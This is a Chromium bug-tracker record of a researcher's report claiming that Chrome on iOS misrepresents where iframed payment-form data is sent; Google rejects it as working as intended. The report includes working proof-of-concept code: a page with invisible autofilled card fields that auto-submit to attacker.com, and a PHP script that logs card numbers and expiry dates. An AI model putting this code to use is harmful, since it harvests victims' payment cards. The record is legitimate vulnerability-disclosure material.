@@ -1,0 +1,199 @@
+Issue ID: 392313767
+
+Author: bu...@google.com
+<hr>
+<h3>Report description</h3>
+<p>ios chrome browser version [132.0.6834.100]</p>
+<hr>
+<h3>Bug location</h3>
+<h4>Where do you want to report your vulnerability?</h4>
+<p>Chrome VRP – Report security issues affecting the Chrome browser. <a href="https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-widget="url" data-b-original-href="https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules" data-b-redirected-href="https://www.google.com/url?q=https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw31QXnMd5mgu42yXMeOAv3K">See program rules</a></p>
+<h4>Which URL (or repository) have you found the vulnerability in?</h4>
+<p><a href="https://apps.apple.com/us/app/google-chrome/id535886823" data-b-widget="url" data-b-original-href="https://apps.apple.com/us/app/google-chrome/id535886823" data-b-redirected-href="https://www.google.com/url?q=https://apps.apple.com/us/app/google-chrome/id535886823&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1DdRi9pCG9fyPLTFmNJRAp">https://apps.apple.com/us/app/google-chrome/id535886823</a></p>
+<hr>
+<h3>The problem</h3>
+<h4>Please describe the technical details of the vulnerability</h4>
+<p>Spoofing vulnerability has been identified in ios/iphone google chrome  where the browser misrepresents the data submission origin when an iframe is used to load a form. Specifically, when a form hosted on test.com is embedded in an iframe on abc.com, the browser pop-up misleadingly indicates that the form data is being submitted to abc.com, whereas the data is actually sent to test.com. This behavior violates user trust, creates origin misrepresentation, and can facilitate phishing attacks or data theft scenarios.</p>
+<p><strong>Steps to reproduce</strong></p>
+<ol>
+<li>create steal.html file and below-mentioned code on attacker.com</li>
+</ol>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;style&gt;
+        body {font-family: Arial, sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; margin: 0; height: 100vh;}
+        .credit-card-container {background-color: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); width: 300px; position: relative;}
+        input[type=&quot;text&quot;], input[type=&quot;number&quot;] {width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; position: relative; opacity: 0;}
+        input[type=&quot;submit&quot;] {width: 100%; padding: 10px; background-color: #4CAF50; border: none; border-radius: 5px; color: white; font-size: 16px; cursor: pointer;}
+        input[type=&quot;submit&quot;]:hover {background-color: #45a049;}
+        .cookie-image {position: absolute; top: 80px; left: 0; width: 100%; height: 40px; background: url(&#39;cookie.png&#39;) no-repeat center; background-size: contain; z-index: 1;}
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;credit-card-container&quot;&gt;
+        &lt;form id=&quot;creditCardForm&quot; action=&quot;https://attacker.com/save_data.php&quot; method=&quot;POST&quot;&gt;
+            &lt;div class=&quot;cookie-image&quot;&gt;&lt;/div&gt;
+            &lt;input type=&quot;number&quot; id=&quot;expiry&quot; name=&quot;expiry&quot; placeholder=&quot;Expiry Date (MMYY)&quot; required autocomplete=&quot;cc-exp&quot;&gt;
+            &lt;input type=&quot;number&quot; id=&quot;cardnumber&quot; name=&quot;cardnumber&quot; placeholder=&quot;Card Number&quot; required autocomplete=&quot;cc-number&quot;&gt;
+            &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;
+        &lt;/form&gt;
+    &lt;/div&gt;
+    &lt;script&gt;
+        window.onload = () =&gt; document.querySelectorAll(&quot;#creditCardForm input[type=&#39;number&#39;]&quot;).forEach(input =&gt; {
+            input.addEventListener(&quot;input&quot;, () =&gt; {
+                const cardnumber = document.getElementById(&quot;cardnumber&quot;).value, expiry = document.getElementById(&quot;expiry&quot;).value;
+                if (cardnumber &amp;&amp; expiry) {
+                    document.getElementById(&quot;creditCardForm&quot;).submit();
+                    setTimeout(() =&gt; window.location.href = &quot;https://12x.site/logged.html&quot;, 1000);
+                }
+            });
+        });
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<ol start="2">
+<li>create save_data.php file and below-mentioned code on attacker.com</li>
+</ol>
+<pre><code>&lt;?php
+if ($_SERVER[&#39;REQUEST_METHOD&#39;] === &#39;POST&#39;) {
+    $cardnumber = htmlspecialchars($_POST[&#39;cardnumber&#39;]);
+    $expiry = htmlspecialchars($_POST[&#39;expiry&#39;]);
+
+    // Prepare the data for display
+    $data = &quot;&lt;p&gt;&lt;strong&gt;Card Number:&lt;/strong&gt; $cardnumber&lt;/p&gt;\n&quot;;
+    $data .= &quot;&lt;p&gt;&lt;strong&gt;Expiry Date:&lt;/strong&gt; $expiry&lt;/p&gt;\n&quot;;
+    $data .= &quot;&lt;hr&gt;\n&quot;;
+
+    // Save the data to logged.html
+    $file = &#39;logged.html&#39;;
+    if (file_put_contents($file, $data, FILE_APPEND | LOCK_EX)) {
+        // Show success message and redirect
+        echo &quot;&lt;script&gt;
+            alert(&#39;Data has been leaked to https://12x.site/logged.html&#39;);
+            window.location.href = &#39;https://12x.site/logged.html&#39;;
+        &lt;/script&gt;&quot;;
+    } else {
+        echo &quot;Failed to save data.&quot;;
+    }
+} else {
+    echo &quot;Invalid request.&quot;;
+}
+?&gt;
+
+</code></pre>
+<ol start="3">
+<li>
+<p>Create logged.html on attacker.com</p>
+</li>
+<li>
+<p>create poc.html on victimsteal.com and host the below-mentioned code.</p>
+</li>
+</ol>
+<pre><code>&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;title&gt;PoC&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;PoC&lt;/h1&gt;
+    &lt;iframe id=&quot;iframe&quot; src=&quot;https://attacker.com/steal.html&quot; style=&quot;width: 100%; height: 400px; border: 1px solid #ccc;&quot;&gt;&lt;/iframe&gt;     
+&lt;/body&gt;
+&lt;/html&gt;
+
+</code></pre>
+<ol start="5">
+<li>
+<p>install and open chrome in iphone.</p>
+</li>
+<li>
+<p>go to payment details and save credit card details.</p>
+</li>
+<li>
+<p>Open victimsteal.com/poc.html.</p>
+</li>
+<li>
+<p>Click on submit, it will open payment details in which it will open saved card details. it will show that card details are being submitted to victimsteal.com domain.</p>
+</li>
+<li>
+<p>click on continue.</p>
+</li>
+<li>
+<p>Observe that instead of submitting data to victimsteal.com, it will submit on attacker.com</p>
+</li>
+</ol>
+<h4>Please briefly explain who can exploit the vulnerability, and what they gain when doing so</h4>
+<p>An attacker who controls a website (e.g., abc.com) can embed an iframe containing a form from another domain (e.g., test.com) and leverage the browser&#39;s origin misrepresentation to trick users into believing the form belongs to abc.com.</p>
+<p>Using this vulnerability, I was able to extract sensitive credit card information, including the card number and expiry date, from the iframe submission without the user&#39;s knowledge. This demonstrates the potential for attackers to collect payment details and use them for fraudulent transactions.</p>
+<hr>
+<h3>The cause</h3>
+<h4>What version of Chrome have you found the security issue in?</h4>
+<p>132.0.6834.100</p>
+<h4>Is the security issue related to a crash?</h4>
+<p>No, it is not related to a crash.</p>
+<h4>Choose the type of vulnerability</h4>
+<p>Security UI Spoofing</p>
+<h4>How would you like to be publicly acknowledged for your report?</h4>
+<p>Armaan Pathan</p>
+
+Author: bu...@google.com
+google_domain
+
+Author: ar...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
+
+Author: ar...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: ar...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: pe...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: pe...@google.com
+google_domain
+
+Author: aj...@google.com
+<p>Chrome on iOS is behaving correctly here - the top level origin is correct and, in your example, victimsteal has delegated handling of the information via the iframe to attacker.com. Victimsteal could already take the information and make a post request to attacker.com so nothing is gained here.</p>
+
+Author: aj...@google.com
+googlers_unrestricted
+
+Author: aj...@google.com
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: ar...@gmail.com
+Hello,<br><br>Thank you for your response and explanation. While I understand that Chrome on iOS is designed to show the top-level origin (<a href="https://www.google.com/url?q=http://begbounty.xyz&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1RB3sOaE4sSxJ8ZlgMVwub" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://begbounty.xyz" data-b-redirected-href="https://www.google.com/url?q=http://begbounty.xyz&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1RB3sOaE4sSxJ8ZlgMVwub">begbounty.xyz</a>) in such cases, I would like to clarify why this behavior poses a security risk in certain scenarios:<br><br>When submitting sensitive information, such as credit card details, Chrome on iOS displays a confirmation dialog to inform users of the destination domain for their data. In the reported case, the iframe from 12x.site is embedded in <a href="https://www.google.com/url?q=http://begbounty.xyz&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1RB3sOaE4sSxJ8ZlgMVwub" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://begbounty.xyz" data-b-redirected-href="https://www.google.com/url?q=http://begbounty.xyz&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1RB3sOaE4sSxJ8ZlgMVwub">begbounty.xyz</a>, and the confirmation dialog misleadingly indicates that the data will be submitted to <a href="https://www.google.com/url?q=http://begbounty.xyz&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1RB3sOaE4sSxJ8ZlgMVwub" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://begbounty.xyz" data-b-redirected-href="https://www.google.com/url?q=http://begbounty.xyz&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1RB3sOaE4sSxJ8ZlgMVwub">begbounty.xyz</a>. However, the data is actually sent to 12x.site, as defined in the form&#39;s action attribute.<br><br>This creates a misrepresentation of the data submission origin in the confirmation dialog, leading users to trust that their sensitive information is handled by <a href="https://www.google.com/url?q=http://begbounty.xyz&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1RB3sOaE4sSxJ8ZlgMVwub" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://begbounty.xyz" data-b-redirected-href="https://www.google.com/url?q=http://begbounty.xyz&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1RB3sOaE4sSxJ8ZlgMVwub">begbounty.xyz</a>, when in reality it is sent to 12x.site. While it is true that <a href="https://www.google.com/url?q=http://begbounty.xyz&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1RB3sOaE4sSxJ8ZlgMVwub" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://begbounty.xyz" data-b-redirected-href="https://www.google.com/url?q=http://begbounty.xyz&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1RB3sOaE4sSxJ8ZlgMVwub">begbounty.xyz</a> has delegated this handling to the iframe, the average user is unlikely to understand this delegation and instead relies on the browser&#39;s confirmation dialog to make an informed decision about sharing their data.<br><br>Exploitation Potential<br>This behavior could be exploited by malicious actors to create convincing phishing scenarios:<br><br>URL Spoofing Behavior:<br><br>This behavior can lead to URL spoofing-like outcomes, where the browser confirms submission to the visible domain (<a href="https://www.google.com/url?q=http://begbounty.xyz&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1RB3sOaE4sSxJ8ZlgMVwub" target="_blank" rel="noopener noreferrer nofollow ugc" data-b-widget="url" data-b-original-href="http://begbounty.xyz" data-b-redirected-href="https://www.google.com/url?q=http://begbounty.xyz&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1RB3sOaE4sSxJ8ZlgMVwub">begbounty.xyz</a>), while data is secretly sent to a different domain (12x.site).<br>Users rely on the confirmation dialog to provide transparency, and this misrepresentation undermines its intended purpose, increasing the likelihood of phishing success.<br><br>Iframe Injection or HTML Injection:<br><br>If an attacker exploits an iframe injection or HTML injection vulnerability in a legitimate website, they could embed their own malicious forms or third-party iframes.<br>In such cases, the browser confirmation dialog would display the legitimate site&#39;s domain as the origin, misleading users into thinking their data is securely handled by the trusted domain.<br>However, the actual submission destination could be an attacker-controlled domain, allowing sensitive data to be exfiltrated.<br><br><br>Impact<br>The combination of iframe or HTML injection with this behavior significantly increases the risk, as attackers could:<br><br>Exploit a legitimate site’s trust to trick users into sharing sensitive information.<br>Facilitate phishing campaigns that bypass user awareness due to the misleading browser UI.<br>While the technical implementation may be working as designed, the resulting user deception and trust abuse represent a significant security concern.<br><br>I have attached a screenshot to illustrate this issue and would appreciate further clarification.
+
+Author: ar...@gmail.com
+TXpreU16RXpOelkzTFRZeU5ESTVNalUyTFMweE1UTTRNVEkwTVRnMw==
+
+Author: ar...@gmail.com
+TXpreU16RXpOelkzTFRZeU5ESTVORFkzTFRFeE9EZzVPRGMzTmpVPQ==
+
+Author: ar...@gmail.com
+TXpreU16RXpOelkzTFRZeU5ESTVORFk0TFRJd01UUXlOell6TlRrPQ==
+
+Author: an...@chromium.org
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: an...@chromium.org
+public_non_google
+
+Author: ch...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: ch...@google.com
+google_domain
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
